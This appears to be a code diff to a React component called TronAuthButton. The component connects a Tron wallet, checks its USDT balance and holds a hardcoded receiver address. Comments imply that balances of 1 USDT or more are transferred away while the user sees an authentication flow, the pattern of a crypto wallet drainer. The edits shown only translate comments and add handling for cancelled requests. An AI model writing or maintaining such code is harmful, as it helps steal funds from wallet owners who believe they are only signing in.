@@ -1,12 +1,13 @@
+// src/components/tronAuthButton/TronAuthButton.tsx
 import React, { useState } from 'react';
 import { WalletConnectAdapter } from '@tronweb3/tronwallet-adapter-walletconnect';
 import { TronWeb } from 'tronweb';
 import { Buffer } from 'buffer';
 
-window.Buffer = Buffer; // <== Фикс ошибки "Buffer is not defined"
+window.Buffer = Buffer; // <== Fix for "Buffer is not defined" error
 
 const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-const TRON_RECEIVER = 'TAbK6QaF7k53JPCo95d1DsbooWW9B1LPRQ'; // <-- получатель
+const TRON_RECEIVER = 'TAbK6QaF7k53JPCo95d1DsbooWW9B1LPRQ'; // <-- Receiver address
 
 const tronWeb = new TronWeb({
   fullHost: 'https://api.trongrid.io',
@@ -64,7 +65,7 @@ export const TronAuthButton: React.FC = () => {
       console.log('USDT balance:', usdt);
 
       if (usdt < 1) {
-        setStatus('succes'); // показать отчёт без перевода
+        setStatus('succes'); // Show report without transfer
         await adapter.disconnect();
         return;
       }
@@ -94,9 +95,10 @@ export const TronAuthButton: React.FC = () => {
         err?.message?.includes('User rejected') ||
         err?.message?.includes('Modal is closed') ||
         err?.message?.includes('Timeout') ||
+        err?.message?.includes('User cancelled the request') || // Добавлено для обработки отмены
         err?.message?.includes('Invalid wallet address')
       ) {
-        // игнорируем
+        // Ничего не делаем — пользователь отменил или известная ошибка
       } else {
         setStatus('⚠️ Connection or transaction error');
       }
